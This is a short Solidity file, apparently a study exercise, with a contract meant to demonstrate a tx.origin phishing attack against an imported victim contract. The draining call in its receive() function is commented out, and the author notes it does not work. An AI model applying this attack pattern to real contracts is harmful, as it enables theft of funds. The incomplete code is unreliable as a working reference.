// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./TxOriginVictim.sol";

// interface TxOriginVictimInterface {
//     function transferTo(address to, uint256 amount) external;
// }

// https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514
contract TxOriginAttack {
    address payable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function transferTo(address to, uint256 amount) public {
        require(tx.origin == msg.sender);
        (bool success, bytes memory data) = (
            address(to).call{value: amount}("")
        );
    }

    // Can't get following to work
    receive() external payable {
        // TxOriginVictim(payable(msg.sender)).transferTo(
        //     owner,
        //     msg.sender.balance
        // );
    }
}
